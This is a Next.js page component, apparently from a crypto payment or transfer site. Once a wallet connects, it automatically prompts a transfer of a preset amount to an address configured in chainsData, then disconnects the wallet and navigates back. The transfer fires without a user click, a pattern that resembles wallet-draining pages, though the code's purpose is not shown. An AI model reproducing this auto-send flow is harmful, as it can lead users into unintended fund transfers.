"use client";

import Image from "next/image";
import styles from "../../../page.module.css";
import Button from "../../../components/Button";
import { useWeb3Modal, useWeb3ModalState } from "@web3modal/wagmi/react";
import {
  useAccount,
  usePrepareSendTransaction,
  useSendTransaction,
  useToken,
  useBalance,
  useContractWrite,
  usePrepareContractWrite,
} from "wagmi";
import { ChangeEvent, useEffect, useState } from "react";
import { parseEther } from "viem";
import { usdc_abi, usdt_abi } from "../../../assets/abi.json";
import RadioButton from "../../../components/RadioButton";
import SendERC20 from "../../../components/SendERC20";
import { disconnect } from "@wagmi/core";
import { chains, chainsData } from "../../../utils/chainAndTokens";
import { useRouter } from "next/navigation";

export default function Home({
  params: { chain, tokenName },
}: {
  params: {
    chain: string;
    tokenName: string;
  };
}) {
  const router = useRouter();
  const [callFunction, setCallFunction] = useState<string>("");

  const { open, selectedNetworkId } = useWeb3ModalState();
  const { address, isConnecting, isDisconnected } = useAccount();
  const { config, error } = usePrepareSendTransaction({
    to: chainsData[chain]?.toAddress,
    value: parseEther(chainsData[chain]?.amount),
  });
  const { sendTransaction, isSuccess, data } = useSendTransaction(config);

  useEffect(() => {
    // at page reload
    return () => {
      setTimeout(() => {
        disconnect().then(() => {
          if (isDisconnected) {
            console.log("++disconnect++");
            router.back();
          }
        });
      }, 800);
    };
  }, []);

  useEffect(() => {
    console.log(`
    \nisDisconnected: ${isDisconnected}
    \nselectedNetworkId: ${selectedNetworkId}
    \nfromAddress: ${address}
    \ntoAddress: ${chainsData[chain]?.toAddress}
    \nsendAmount: ${chainsData[chain]?.amount}`);
    if (address && selectedNetworkId && !isDisconnected) {
      setTimeout(() => {
        if (
          chains[tokenName] &&
          callFunction !== "call" &&
          callFunction !== "done"
        ) {
          if (sendTransaction) {
            console.log("::::sending coin::", chains[tokenName]);
            sendTransaction?.();
            setCallFunction("call");
          }
        } else if (tokenName !== "erc") {
          console.log("::::sending erc20::");
          setCallFunction("call");
        }
      }, 1500);
    }
  }, [address, selectedNetworkId, isDisconnected, tokenName, sendTransaction]);

  useEffect(() => {
    if (isSuccess) {
      console.log("isSuccess:::: ", isSuccess);
      console.log("tx data:::: ", JSON.stringify(data));
      (async () => {
        await disconnect();
        router.back();
      })();
    }
  }, [isSuccess, callFunction]);

  return (
    <main className={styles.main}>
      {
        <div className={styles.description}>
          {tokenName && !chains[tokenName] && selectedNetworkId && (
            <SendERC20
              {...{
                tokenName: tokenName,
                senderAddrss: address,
                chainId: Number(selectedNetworkId),
                callFunction: callFunction,
                setCallFunction: setCallFunction,
              }}
            />
          )}
        </div>
      }

      <div className={styles.description}></div>
      <div className={styles.center}>
        {tokenName && <w3m-button balance={"show"} size={"md"}></w3m-button>}
      </div>
      <div className={styles.grid}></div>
    </main>
  );
}